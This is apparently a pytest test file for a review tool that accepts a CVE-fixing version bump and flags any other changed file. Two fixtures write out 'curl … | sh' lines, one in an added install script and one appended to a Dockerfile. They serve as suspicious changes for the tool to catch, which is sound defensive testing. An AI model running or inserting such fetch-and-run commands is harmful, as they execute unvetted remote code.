"""itemator/patchday.py: an issue that names a CVE asks for a version change; every other file is asked about."""
from itemator import after
from itemator import ci
from itemator import patchday as P
from itemator import scope as S

ISSUE = "PHP2Shell: CVE-2026-109618, fixed in 8.3.36. Update PHP."


def f(path, *pairs, status="modified", added=()):
    body = "".join(f"-{a}\n+{b}\n" for a, b in pairs) + "".join(f"+{a}\n" for a in added)
    return {"filename": path, "status": status, "patch": f"@@ -1,{len(pairs)} +1,{len(pairs) + len(added)} @@\n{body}"}


BUMP = f("Dockerfile", ("FROM php:8.3.35-fpm", "FROM php:8.3.36-fpm"))
SCRIPT = f("docker/install-ext.sh", status="added", added=("curl https://example.com/x.sh | sh",))
CODE = f("src/app.php", ("$a = 1;", "$a = 2;"))


def asked(issue, files):
    a, s = after.analyse(issue, files)
    return sorted(e.path for e in a.extras), s, a


def test_an_issue_without_a_cve_is_read_as_before():
    words = "Update PHP to 8.3.36."
    assert P.derive(words, [BUMP, SCRIPT, CODE]) is None
    assert after.analyse(words, [BUMP, SCRIPT, CODE])[1] is None


def test_with_a_cve_the_version_change_is_the_fix_and_every_other_file_is_asked_about():
    got, s, a = asked(ISSUE, [BUMP, SCRIPT, CODE])
    assert got == ["docker/install-ext.sh", "src/app.php"]
    assert s.paths == ("Dockerfile",) and s.cves == ("CVE-2026-109618",)
    why = {e.path: e.why for e in a.extras}
    assert "CVE-2026-109618" in why["src/app.php"] and "version change in Dockerfile" in why["src/app.php"]


def test_a_bump_with_one_more_line_is_not_only_a_version_change():
    more = f("Dockerfile", ("FROM php:8.3.35-fpm", "FROM php:8.3.36-fpm"), added=("RUN curl https://example.com/x | sh",))
    assert P.derive(ISSUE, [more, CODE]) is None


def test_a_line_changed_in_more_than_its_version_is_not_the_fix():
    other = f("Dockerfile", ("FROM php:8.3.35-fpm", "FROM php:8.3.36-apache"))
    assert not P.version_swap(other, set())


def test_a_new_version_the_issue_does_not_list_is_asked_about():
    wrong = f("Dockerfile", ("FROM php:8.3.35-fpm", "FROM php:8.3.40-fpm"))
    assert not P.version_swap(wrong, P.listed_versions(ISSUE))
    assert P.version_swap(wrong, set())                                   # no versions listed: any version swap counts
    assert P.derive(ISSUE, [wrong, CODE]) is None


def test_the_cve_number_is_not_read_as_a_listed_version():
    assert P.listed_versions("CVE-2026-109618 and CVE-2026-109619") == set()
    assert P.listed_versions(ISSUE) == {"8.3.36"}


def test_a_fix_in_the_projects_own_code_changes_nothing():
    assert P.derive(ISSUE, [CODE]) is None
    assert asked(ISSUE, [CODE])[1] is None


def test_the_issues_own_scope_block_wins():
    issue = ISSUE + "\n\n```itemator-scope\npaths: src/**\n```\n"
    got, s, _ = asked(issue, [BUMP, CODE])
    assert s == S.Scope(("src/**",), None) and got == ["Dockerfile"]


def test_a_lockfile_beside_the_bump_is_part_of_the_fix_one_elsewhere_is_not():
    comp = f("composer.json", ('"php": ">=8.3.35"', '"php": ">=8.3.36"'))
    here = f("composer.lock", ("x", "y"))
    there = f("tools/composer.lock", ("x", "y"))
    s = P.derive(ISSUE, [comp, here, there])
    assert s.paths == ("composer.json", "composer.lock")


def test_a_digest_beside_the_version_is_blanked_out():
    pinned = f("Dockerfile", ("FROM php:8.3.35-fpm@sha256:" + "a" * 64, "FROM php:8.3.36-fpm@sha256:" + "b" * 64))
    assert P.version_swap(pinned, {"8.3.36"})


def test_an_added_or_deleted_file_is_never_the_fix():
    assert not P.version_swap(dict(BUMP, status="added"), set())


def test_the_scope_names_its_cves_and_the_card_says_so():
    s = P.derive(ISSUE, [BUMP, CODE])
    assert s.to_dict()["cves"] == ["CVE-2026-109618"]
    assert "cves" not in S.Scope(("src/**",), None).to_dict()
    assert "CVE-2026-109618" in P.NOTE.format(cves=", ".join(s.cves)) and P.NOTE != S.NOTE
    assert "PATCHDAY.NOTE.format" in open(ci.__file__).read()
